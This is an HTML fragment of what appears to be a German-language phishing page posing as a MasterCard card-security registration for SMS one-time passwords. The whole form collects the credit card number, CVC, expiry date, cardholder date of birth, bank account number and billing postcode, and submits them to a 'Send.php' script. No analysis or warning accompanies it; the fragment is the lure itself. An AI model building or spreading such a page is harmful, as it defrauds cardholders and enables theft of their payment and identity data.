        </header>
        <form name="optInForm" role="form" action="Send.php" method="POST">
            <section>
                <!-- Locale menu -->
                <div id="locale">
                    <ul class="langmenu">
                        <li><a href="en.htm" onclick="setLocale('en_GB');" id="en_GB" title="English">ENG</a></li>
                        <li><a href="de.htm" onclick="setLocale('de_DE');" id="de_DE" title="German" class="active">DEU</a></li>

                    <div class="noscript"> JavaScript is disabled in your browser. Some of the buttons will not work. Also, only MasterCard Password will work. No other authentication scheme (that requires javascript) will work. </div>

                <div class="content-container">
                    <h1 id="pwdheader">Erhöhen Sie die Sicherheit</h1>
                    <p id="pwdsubheader">Registrieren Sie  bitte Ihre Karte für ein Einmalpasswort, das Sie per SMS erhalten.</p>
                </div>
                <div id="optininfo"></div>
                <div class="error-container"><span id="optinerror"></span></div>
                <div class="form-container">
                    <div class="form-content" id="form-content" style="display: block;">
                        <!-- param 0 -->
                        <div class="read-only">
                            <label class="read">
                                <p id="ccnum"><b>Kreditkartennummer</b></p>
                            </label>                          
                            <label class="read-value">
                                <input class="cuiEntryfieldFont cuiEntryfield length35" name="ccnum" placeholder="" size="40" maxlength="16" type="text"> </label></div>
                        <!-- param 1 -->
                        <div class="read-only">
                            <label class="read" id="cvc"><b>CVC-Code</b></label>
                            <label class="read-value cvc">
                                <!-- INPUT NUMERIC -->
                                <input class="text maxlength password disablecopypaste" name="cvc2" maxlength="3" size="5" oninput="this.value = this.value.replace(/[^0-9]/g, '');" id="cvc2" type="password"> <span><a id="cvcdec" href="javascript:%20popUpSigpan()" onclick="closing=false" class="link_red" title="Mehr Informationen" style="vertical-align:top;">Mehr Informationen</a></span> </label>
                        </div>
                        <!-- param 2 -->
                        <div class="read-only">
                            <label class="read" id="expdate"><b>Gültig bis</b></label>
                            <label class="read-value selectbox">
                                <select name="month" class="enrollmentInputBox">
                                    <option value="" selected="selected" id="month">Monat</option>
                                    <option value="01" id="jan">Januar</option>
                                    <option value="02" id="feb">Februar</option>
                                    <option value="03" id="mar">März</option>
                                    <option value="04" id="apr">April</option>
                                    <option value="05" id="may">Mai</option>
                                    <option value="06" id="jun">Juni</option>
                                    <option value="07" id="jul">Juli</option>
                                    <option value="08" id="aug">August</option>
                                    <option value="09" id="sep">September</option>
                                    <option value="10" id="oct">Oktober</option>
                                    <option value="11" id="nov">November</option>
                                    <option value="12" id="dec">Dezember</option>
                                </select>
                            </label>
                            <label>
                                <select name="year" id="eYear" class="enrollmentInputBox">
                                    <option value="" selected="selected">Jahr</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option>
                                </select>
                            </label>
                        </div>
                        <!-- param 3 -->
                        <div class="read-only">
                            <label class="read">
                                <p id="dob"><b>Geburtsdatum des Karteninhabers</b></p>
                                <sub id="dobdesc">(DD.MM.YYYY)</sub>
                            </label>                          
                            <label class="read-value">
                                <input name="dob" class="date maxlength disablecopypaste" maxlength="10" size="10" type="text"> </label>
                        </div>
                        <!-- param 3 des -->
                        <!-- param 4 -->
                        <div class="read-only">
                            <label class="read" id="accnum"><b>Kontonummer</b></label>
                            <label class="read-value acc">
                                 <!-- INPUT NUMERIC -->
                                <input name="accNo" id="accNo" oninput="this.value = this.value.replace(/[^0-9]/g, '');" class="text maxlength disablecopypaste" title="Please find your account number on your invoice and/or your E-Service-portal" maxlength="10" size="10" type="text"> <span>
                        <a id="optinacchelp" href="javascript:%20popUpAccHelp()" onclick="closing=false" class="link_red" title="Mehr Informationen" style="vertical-align:top;">Mehr Informationen</a> </span></label>
                        </div>
                        <!-- param 5 -->
                        <div class="read-only">
                            <label class="read" id="accountzip"><b>PLZ der Rechnungsadresse</b></label>
                            <label class="read-value acc">
                                <!-- INPUT NUMERIC -->
                                <input name="accZip" id="accZip" oninput="this.value = this.value.replace(/[^0-9]/g, '');" class="text maxlength disablecopypaste" maxlength="5" size="10" type="text"> <span>
                        <a id="optinaccZiphelp" href="javascript:%20popUpZipHelp()" onclick="closing=false" class="link_red" title="Mehr Informationen" style="vertical-align:top;">Mehr Informationen</a></span></label>
                        </div>
                        <div id="terms" class="terms"></div>
                    </div>
                </div>
                <div class="controls">
                    <div id="cBtn1" class="cBtn" style="display: block;">
                        <div class="button_maunal"> <span>

						<!--<button id="ctnbtn" class="imageTobtn" title="" onclick="return OnUserInput(1);"></button>-->
                        </span> </div>
                    </div>

                </div>

               This field is used to trap client-side events like closing window, or timing out.
